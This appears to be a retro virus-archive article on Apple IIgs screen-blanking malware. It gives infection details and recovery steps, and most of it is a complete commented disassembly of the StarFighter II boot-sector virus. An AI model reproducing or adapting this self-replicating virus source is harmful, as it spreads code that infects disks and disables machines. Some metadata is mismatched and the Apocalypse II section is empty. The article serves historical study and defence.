Title: BlackOut
Date: 2026-08-20
Category: P16-IIGS
Tags: bootvir, prodos16, appleiigs
Preview: gallery/viruses/appleii/apocalypsei.png
Summary: This article is about the CyberAIDS virus...

## StarFighter II

### Details
* *Versions:* StarFighter II
* *Author:* Jim Fraser (presumably); perhaps someone from the group "F.U.C.K."
* *infects:* blocks 0, 1, RAM
* *date:* 1989-1990
* *detonation conditions:* if the infection counter has reached 8 and the time is greater than or equal to 19:00

The description of Deverminator II states:

Virus Name: STARFIGHTER II  
Registration code: 33FKr494  
Symbiotic formula: 4-Nitrophenol C6H5NO3  
Origin: Florida (USA)  
Conceptors: Unknown  
Viral infestors: Everybody  
Incubation: Special  
Disease attack: After 7 PM  
First effects: Total blackout  
Second effects: Hanged machine  

### Description

Starfighter II (aka Screen Blanker, aka BlackOut) lives on block 1 of a 3.5" disk, and keeps the new style ProDOS/SOS boot block mainly intact. The code tags onto the end of Apple's code at $A6A during the boot, and is called by the normal ProDOS startup JMP instruction. Instead of going straight to ProDOS at $2000, it dives into $A00, which in turn JMPs up to $A6A. This is a copy routine which moves the entire $200 block from $00/0A00 to $E1/0A00. It then patches into one of the disk vectors in bank $E1, and JMPs back down to ProDOS at $00/2000.

Now whenever the IIgs calls this vector, Starfighter II intercepts it and re-copies itself down to $00/0A00. This is where all the work is done. Block 0 is read from the currently inserted disk, and checked to see if Starfighter II is installed. If not, the block is modified in memory, and written back to disk. The Starfighter II code at $0A00 is then written straight over block 1. The disk is now infected.

The virus is triggered by a certain count, stored in an unused location in the 'Battery Backed-Up' section of onboard RAM (This is a small section of IIgs memory that stores all Control Panel settings). The count is
incremented every time you boot from an infected disk. Every eight infections, an extra check is made. If the time is 7pm or over, or 1900hrs for those who simply "feel good" being able to talk in 24 hour time, the virus is triggered. The time, by the way, is extracted from your current system time, by using the _ReadTimeHex call in the Miscellaneous tool set.

Firstly, your battery RAM text screen color, border color, background color, and system volume, are all set to zero. For the uninitiated, color zero is black. This effectively blanks out your screen as if it was turned off, and because there is no sound, you are fooled into thinking that Control-Reset isn't working! Now if you turn the IIgs off, and then back on again, leaving 30 seconds or so between of course, the screen will still remain blank, because the battery RAM has remembered! Likewise, because there is no sound, it seems like the IIgs hasn't even powered up! Although the drive light coming on would be a definite giveaway, it would that is if Starfighter II hadn't already changed your startup slot to 8. Of course the IIgs doesn't have an 8th slot, so it simply hangs "Check startup device".....

And if you start thinking about changing the battery RAM yourself, as it is kept in memory at $E1/02C0, and writing it back with the _WriteBRam call from the monitor, apart from trying not to make typos because the screen is blank, then you're in for another surprise, because Starfighter II has patched the vector out so it has no effect.

One thing this virus doesn't do however, is destroy your data. It is completely safe in that respect.
One interesting thing to note, is that if your date format in the Control Panel is set to YY/MM/DD, and your time is set to 24 hours. Okay, so I take back my comment regarding 24-hour time. Then Starfighter II will not be infected. Why? Because the code checks it! I assume the author needed some sort of protection.....

Neither a warm nor a cold reboot will help against this virus. So what should I do if it's already detonated? Try this: you can remove the IIGS battery for a couple of minutes so it can forget the virus from its memory. You can also try pressing RESET and entering "PR#7." Or you can try accessing the control panel by holding down the option key while turning on the IIGS. You won't see it, but it will say:

1=Enter the Control Panel  
2=Set system standards at 60 hertz.  
3=Set system standards at 50 hertz.  
4=Continue restarting the system.  

Press 1 , 2 , 3 o r 4 t o continue.
Even though you can't see the menu, you can still use it. Press "2," and the IlGs will set all the Control Panel settings to their defaults. Screen colors will be set to white for the text, and medium blue for the background and border—you'll be able to see again! The sound volume will be restored—you'll be able to hear again! The startup slot will be set to "Scan" —you'l be able to boot again!

The Starfighter II virus gets its name from an eyecatcher stored at the end of the virus code. The complete string is "Starfighter" II(c)", and is stored backwards, that is ")c(II rethgifratS".

### StarFighter II code. Disassembled by Derek Young.
	**************************************************
	*                                                *
	*         -- The StarFighter II virus --         *
	*       -- Disassembled by Derek Young --        *
	*                                                *
	**************************************************
		 lst off
		 xc
		 xc
		 mx %11
		 org $800
	
	ToWriteBRam = $E10080
	
	bramText = $E102DA
	bramBackground = $E102DB
	bramVolume = $E102DE ;Sound volume (0-16)
	
	bramStartSlot = $E102E8
	bramMonthFormat = $E102F4 ;Format of data (m/d/y, d/m/y, y/m/d)
	
	H0C23 = $0C23
	
	ReadTimeHex = $0D03
	
	RebootVector2 = $E116B8 ;the mystery vector
	Unknown2 = $0FB6 ;an unknown vector (probably a flag)
	
	Phase = $C080
	DriveOff = $C088 ;for disk ][ access
	DriveOn = $C089
	ProDriver = $C50A
	
	HOME = $FC58
	Tool_Entry = $E10000
	
	SmartEntry = $48
	
	UnitNum = $43
	Command = $42 ;these are for the prodos device driver
	Buffer = $44
	BlockNum = $46
	
	*-------------------------------------------------
	* Block 0 - this block is only slightly altered from
	* a prodos boot block (the changed opcodes are shown
	* in uppercase in the comments).
	
	Block0 hex 01 ;signature byte
		 sec
		 bcs H0807
		 jmp H091C ;why this would happen I don't know....
	
	H0807 sei  ;disable interrupts
		 stx UnitNum ;on bootup, x holds the unitnum
		 cmp #$03
		 php
		 txa
		 and #$70
		 lsr
		 lsr
		 lsr
		 lsr
		 ora #$C0 ;make this $Cx with x as the slot number
		 sta SmartEntry+1
		 ldy #$FF
		 sty SmartEntry ;$CxFF
		 plp
		 iny  ;make Y=0
		 lda (SmartEntry),Y ;check the SmartPort dispatch
		 bne H085C
		 bge Slot6 ;slot number greater than three?
		 lda #$03
		 sta Block0 ;booting from slot 3
		 inc $3D
		 lda SmartEntry+1 ;$Cx
		 pha
		 lda #$5B
		 pha
		 rts  ;jump to $Cx5B
	
	*-------------------------------------------------
	* Set up a routine to read in a block from a Disk ][
	
	Slot6 sta $40 ;A=0, clear $40,$48
		 sta SmartEntry
		 ldy #$5E ;Disk ][ - $C65E - "read first track, first sector
	]copy lda (SmartEntry),Y ;and begin execution of code there."
		 sta DiskII-$5E,Y
		 iny
		 cpy #$EB ;this code copies the Disk ][ firmware into
		 bne ]copy ;a buffer so Prodos can read the rest of the blocks
	
		 ldx #8-2
	]patch ldy Offsets,X ;get the address of the change
		 lda Changes,X ;the byte it's changed to
		 sta DiskII,Y ;store it in the code
		 lda NewCode,X ;copy prodos's routine into the end
		 sta DiskII+$8D,X
		 dex
		 bpl ]patch
	
		 lda #$09
		 sta SmartEntry+1
		 lda #$86
	H085C ldy #$00
		 cmp #$F9
		 bcs :gerr
		 sta SmartEntry
		 sty $60
		 sty $4A
		 sty $4C
		 sty $4E
		 sty BlockNum+1
		 iny
		 sty Command
		 nop ;INY (skipped so SF can read in block 1)
		 sty BlockNum
		 lda #$0A ;LDA #$0C
		 sta $61 ;Set up the buffer of the block to read
		 sta $4B
	]read jsr DoBlock
		 bcs goerr ;print the error message
		 inc $61 ;increment the buffer
		 inc $61
		 inc BlockNum ;next block
		 lda BlockNum ;read up to block 6
		 cmp #$06
		 blt ]read
		 lda $C00
		 ora $C01 ;check the link to the next block
	:gerr bne goerr
	
		 lda #$04
		 bne H0899
	]loop lda $4A
	H0899 clc
		 adc H0C23
		 tay
		 bcc H08AD
		 inc $4B
		 lda $4B
		 lsr
		 bcs H08AD
		 cmp #$0A
		 beq H091C
		 ldy #$04
	H08AD sty $4A
		 lda H0920
		 and #$0F
		 tay
	H08B5 lda ($4A),Y
		 cmp H0920,Y
		 bne ]loop
		 dey
		 bpl H08B5
		 ldy #$16
		 lda ($4A),Y
		 lsr
		 adc H091F
		 sta H091F
		 ldy #$11
		 lda ($4A),Y
		 sta BlockNum
		 iny
		 lda ($4A),Y
		 sta BlockNum+1
		 lda #$00
		 sta $4A
		 ldy #$1E
		 sty $4B
		 sty $61
		 iny
		 sty $4D
	H08E2 jsr DoBlock
	goerr bcs H091C
		 inc $61
		 inc $61
		 ldy $4E
		 inc $4E
		 lda ($4A),Y
		 sta BlockNum
		 lda ($4C),Y
		 sta BlockNum+1
		 ora ($4A),Y
		 bne H0913
		 ldx #$01
		 lda #$00
		 tay
	H0900 sta ($60),Y
		 iny
		 bne H0900
		 inc $61 ;NOP NOP
		 inc $61
		 dex
		 bpl H0900
		 sec  ;DEC 91F
		 lda $61 ;BEQ label {+07}
		 sbc #$04 ;BNE label {-28}
		 sta $61
	H0913 dec H091F
		 bne H08E2
		 cli
		 jmp Block1 ;JMP $2000
	
	H091C jmp PrintError
	
	H091F hex 02
	
	H0920 asc 26'PRODOS'
	
	DoBlock lda $60
		 sta Buffer
		 lda $61
		 sta Buffer+1
		 jmp (SmartEntry)
	
	
	*-------------------------------------------------
	* This is a patch table used so prodos can copy
	* the disk ][ firmware and patch it.
	
	Offsets hex 08,1E,24,3F,45,47,76
	
	Changes hex F4
		 hex D7 ;these are the new bytes, patched into the code
		 hex D1 ;at the above offsets.
		 hex B6
		 hex 4B
		 hex B4
		 hex AC
	
	NewCode ldx $2B ;this code is patched into the new code as well
		 clc
		 rts
		 jmp H09BC ;(jump out into the bootblock)
	
	*-------------------------------------------------
	* Print the standard prodos error message and hang
	
	PrintError jsr HOME
		 ldy #21-1
	]loop lda ErrMsg,Y
		 sta $5B1,Y ;store it on the screen
		 dey
		 bpl ]loop
	
	:hang jmp :hang
	
	ErrMsg asc "UNABLE TO LOAD PRODOS"
	
	*-------------------------------------------------
	* These are routines used by the prodos so that it
	* can read from a Disk ][.  They are called by the
	* patched firmware copied into "DiskII".
	
	phaseon lda $53 ;phase number
	phaseon2 and #%11
		 rol
		 ora $2B ;slot number
		 tax
		 lda Phase,X ;turn a phase on or off
		 lda #$2C
	H097A ldx #$11
	H097C dex  ;timing routine
		 bne H097C
		 sbc #$01
		 bne H097A
		 ldx $2B
		 rts
	
		 lda BlockNum
		 and #$07
		 cmp #$04
		 and #$03
		 php
		 asl
		 plp
		 rol
		 sta $3D
	H0994 lda BlockNum+1
		 lsr
		 lda BlockNum
		 ror
		 lsr
		 lsr
		 sta $41
		 asl
		 sta $51
		 lda Buffer+1
		 sta $27
		 ldx $2B ;get the slot number
		 lda DriveOn,X ;turn the drive on
		 jsr H09BC
		 inc $27
		 inc $3D
		 inc $3D
		 bcs H09B8
		 jsr H09BC
	H09B8 ldy DriveOff,X ;turn the drive off
	H09BB rts
	
	H09BC lda $40
		 asl
		 sta $53
		 lda #$00
		 sta $54
	H09C5 lda $53
		 sta $50
		 sec
		 sbc $51
		 beq H09E2
		 bcs H09D4
		 inc $53
		 bcc H09D6
	H09D4 dec $53
	H09D6 sec
		 jsr phaseon
		 lda $50
		 clc
		 jsr phaseon2 ;alternate entry
		 bne H09C5
	H09E2 ldy #$7F
		 sty $52
		 php
	H09E7 plp
		 sec
		 dec $52
		 beq H09BB
		 clc
		 php
		 dey
		 beq H09E7
	
	DiskII ds $A00-*-1
	InfectedBy hex 10 ;HEX 00 in a normal prodos block
	   ;This is the virus number the block was infected
	   ;by (I think)
	
	**************************************************
	* Block 1 - designed to look similar to the Apple III's
	* SOS boot block.  This is where the virus is.
	
	Block1 jmp InstallVirus
		 asc 'SOS BOOT  1.1 '
		 str 'SOS.KERNEL'
		 asc '     SOS KRNLI/O ERROR'0800
		 asc 'FILE '27'SOS.KERNEL'27' NOT FOUND%'00 ;(27's are ')
		 asc 'INVALID KERNEL FILE:'00
		 hex 00
	
	InfectCount da 7
	Count hex 10
	
	InstallVirus clc
		 xce
		 sep $30
		 ldal $E116B8 ;an unknown vector
		 cmp #$4C
		 bne :skip1
		 ldal $E10A69 ;(the hex 10 right above)
		 cmp InfectedBy ;has the virus been installed already?
		 bge :skip2
	:skip1 rep $30
		 lda #$200-1 ;length to move
		 ldx #$A00 ;source,destination
		 txy
		 mvn $000000,$E10000 ;move block 1 into bank $E1
	:skip2 rep $30
		 jml $E10A91 ;jump to this exact place in bank $E1
	   ;now we're running in $E1
		 lda RebootVector2
		 cmp #$BB4C ;JMP xxBB?
		 beq :done ;yes...
		 lda RebootVector2 ;save the old vector
		 sta Return
		 lda RebootVector2+2
		 sta Return+2
		 lda #Virus ;new location to jump to
		 sta RebootVector2+1
	:done sep %00110001
		 xce  ;emulation mode
		 lda #$4C
		 sta RebootVector2 ;store a jump at the unknown vector
		 and #$00
		 pha
		 plb  ;data bank = 0
		 jml $002000 ;jump to PRODOS
	
		 mx %00
	Virus phb
		 phk
		 plb
		 lda #$0102
		 cmp bramMonthFormat
		 beq Store+1
		 stz Unknown2 ;another unknown vector
	
		 lda #$200-1 ;length of block to copy
		 ldx #$A00 ;address of source and destination
		 txy
		 mvn $E10000,$000000 ;copy this code into bank $00
		 jsl $000B1E ;jump to "Infect" in bank $00
		 phk
		 plb  ;set the data bank = 0
		 lda InfectCount
		 and #%111 ;divisible by eight evenly?
		 bne Leave
	
		 pha
		 pha ;result space
		 pha
		 pha
		 ldx #ReadTimeHex
		 jsl Tool_Entry
		 plx  ;minute and second
		 pla  ;year and hour
		 plx  ;month and day
		 plx  ;week day
		 and #$00FF ;check the hour
		 cmp #18+1 ;is it after 6 o'clock?
		 blt Leave ;not yet
	
		 stz bramText
		 stz bramBackground ;set all the screen colors to black
		 stz bramVolume ;also set the volume to 0 so a bootup can't be heard
	
		 sep $30
		 lda #8 ;8 = start RAM disk
		 sta bramStartSlot
	
		 jsl ToWriteBRam ;write the new paramaters to disk
		 rep $30
		 lda #$B5E2 ;set the ToWriteBRam vector to point to a CLC/RTL!
		 sta ToWriteBRam+1 ;Now even the control panel can't rewrite it.
	Store bit $E98F ;meaningless like this, but when entered on the
		 ora [$E0] ;second byte this turns into STAL $E007E9
	Leave plb
	Return jml $FF0332
	
	* This code reads in the boot block of the disk being booted,
	* infects it and then copies itself onto block 1.
	
	Infect phd
		 inc
		 pha
		 pld
		 sep %00110001
		 xce  ;emulation mode
		 ldal bramStartSlot
		 beq :scan ;booting from Scan?
		 cmp #5 ;booting from slot 5?
		 bne Exit
	:scan lda #$01 ;read
		 sta Command
		 lda #$50
		 sta UnitNum ;read from slot 5
		 lda #$0C
		 sta Buffer+1
		 stz Buffer ;read into $C00
		 stz BlockNum ;block 0
		 stz BlockNum+1
		 jsr ProDriver ;call the prodos device driver
		 bcc :rerr
		 lda #8 ;set startup device to RAM disk
		 stal bramStartSlot
	:rerr lda $DFF ;the starfighter signature byte
		 cmp #$10 ;is this a starfighter block?
		 blt :skip
		 cmp Count
		 bge Exit
	:skip lda Count
		 sta $DFF
	
		 ldx #2
	CheckVer dex
		 bmi Exit
		 lda $C70,X
		 cmp #$C8 ;is this a prodos block?
		 beq :1 ;Prodos block
		 cmp #$EA ;StarFighter block
		 bne CheckVer ;might be off by one
	:1 lda $C74,X
		 cmp #$0C
		 beq :2
		 cmp #$0A
		 bne Exit
	:2 lda #$EA ;NOP
		 sta $C70,X
		 and #$0F ;make it $0A
		 sta $C74,X
		 cpx #0
		 bne Store2+1
		 sta $CFE
	
	Store2 ldal $0D1B8D ;when entered on second byte this is STA $D1B
		 inc Command ;change the command to write
		 jsr ProDriver ;write the altered block back onto the disk
		 bcs Exit
	
		 lda #$0A
		 sta Buffer+1 ;address of where this code is executing ($A00)
		 inc BlockNum ;block 1
		 inc InfectCount ;increment the infection count
		 jsr ProDriver ;write the fake SOS block to block 1
	
	Exit clc
		 xce
		 rep $30
		 pld
		 rtl
	
		 asc ")c(II rethgifratS"
	        ;"Starfighter II(c)"
	
	* This is just filler so the block looks the same length as
	* an SOS boot block
	
		 hex FFEF708441AC0B27915616568200A861
		 hex 4C18B816E1819D564588023328495465
		 hex 7887564211574AB04580633AABCE5645
		 hex 62AB78A222669789
	
		 ds \ ;fill with zeros to the end of the block
	
		 typ BIN
		 sav Star ;save the object code

## Ninja Force Demo Revenge of the bobs

### Details
* *Versions:* There was a version with this bug and it seems there was a version without it, but that's not certain.
* *Authors:* Clue, dRm, Jesse Blue.
* *infects:* RAM
* *date:* Aug 1992
* *detonation conditions:* If you reboot while booting from a disk, a BlackOut effect may occur.

### Description

A demo in which the screen borders, sound, and text are set to 0 (like in StarFighter II!). If you reboot at the wrong time, you'll get the StarFighter II effect, which, like in StarFighter II, will remain in the battery's memory.

It's easier to cure than StarFighter II, as the Ninja Force Demo won't remain in the bootloader; it only exists in memory. I'd like to point out that antivirus utilities won't save you from this demo, as they check for viruses in both memory and the bootloader, and this isn't a virus, just a poorly written demo. To cure this, try one of the memory reset methods, like in StarFighter II:
Try this: you can remove the IIGS battery for a couple of minutes so it can forget the virus from its memory. You can also try pressing RESET and entering "PR#7." Or you can try accessing the control panel by holding down the option key while turning on the IIGS. You won't see it, but it will say:

1=Enter the Control Panel  
2=Set system standards at 60 hertz.  
3=Set system standards at 50 hertz.  
4=Continue restarting the system.  

Press 1 , 2 , 3 o r 4 t o continue.
Even though you can't see the menu, you can still use it. Press "2," and the IlGs will set all the Control Panel settings to their defaults. Screen colors will be set to white for the text, and medium blue for the background and border—you'll be able to see again! The sound volume will be restored—you'll be able to hear again! The startup slot will be set to "Scan" —you'l be able to boot again!

## GS Toner 1.0

### Details
* *Versions:* 1.0, 1.8, 2.0 (2.0 without trojan!)
* *Author:* Joe User
* *infects:* RAM
* *date:* 1988-1991
* *detonation conditions:* change in BASIC code.

GS.TONER — a short Applesoft BASIC program that generates various telephone sounds, including the 12
tones made by pressing a touch-tone keypad,
dial tones, and busy signals. Its description encouraged the user to learn all about the program by listing and modifying it.

Closer examination of GS.TONER showed that assembly code was embedded at the end of the program. This is not necessarily sinister-many programs, including Bob Bishop's early APPLEVISION program, did much the same but in this case, the assembly language program checked to see if the BASIC portion of the program had been altered. If any modification at all was made-as the file description encouraged-the program changed the IIGs battery RAM settings so that the text and border colors match the background color. (That should sound familiar.)

## Screen Blanker

* *Versions:* 1.0?
* *Authors:* ?
* *infects:* blocks 0, 1, RAM, files?
* *date:* 1986?
* *detonation conditions:* accidentally.

Although I mentioned that Screen Blanker and StarFighter II are the same virus, but according to information from the magazine "La Pomme Illustree 0" it is mentioned that this is the first virus on GS/OS that infects files and makes the screen black. Here's its description straight from the magazine: "Screen Blanker is a completely different matter... It's the first file virus for 68/OS, less malicious than the previous ones, but still quite annoying, as you'll see. It doesn't work on a counter, but randomly. As Screen Blanker points out, it gives you a blank screen (as its friendly name suggests, it automatically clears your screen). It's the equivalent of our Blackout virus. This virus erases everything. If you're in text mode, the screen goes completely black...

If you're in graphics mode, the screen also goes completely black, disappearing all palettes. Result: if you've been sitting quietly in front of a word processor for several hours (my case), and see nothing (not my case), then there's a chance, or rather a risk, that good old "Screen Blanker" will come and say hello... Classic, immoral morality... Conditionally informed. Reboot, and that's it. But that's because of this expensive but annoying virus. It could have installed itself on Prodos 8 or Prodos 16, spreading across resources, and remaining invisible...". My confidence that it was just one virus has been shaken...

## Apocalypse I & II

### Details
* *Versions:* I & II
* *Authors:* Perhaps someone from Phoenix Corp. or Spy Network.
* *infects:* blocks 0, 1, RAM
* *date:* 1989-?
* *detonation conditions:* ?

#### Apocalypse I

Most likely a modified version of StarFighter II which is harder to get rid of. Has a reference to StarFighter II at the end of its code has the inscription "I espylacopA" (Apocalypse I) backwards. When detonated, it decrypts the encrypted text, turns the screen and text completely black and displays the text in red letters in the center of the screen on a black background "You should have used Spy Check Up...". This raises suspicions that one of the developers of this antivirus could have released this virus into the wild, but even so, it is a rather rare virus.


![Screenshot of Skull Aids virus]({static}/gallery/viruses/appleii/apocalypsei.png)

#### Apocalypse II



## Info & Links

Starfighter II(c) Virus  
By Richard Bennett  
Copyright (c) 1992 Apple Users' Group, Sydney  
Republished from Applecations, a publication of the Apple Users' Group, Sydney, Australia.  

http://members.iinet.net.au/~kalandi/apple/AUG/1992/03%20MAR/VIRUS.WATCH.html  

La Pomme Illustree 0

II Alive, Mar-Apr 1993, _Infected!_, Doug Cuff, pp. 28-33  
II Alive, May-Jun 1993, _Infected!, part 2_, Doug Cuff, pp. 40-42
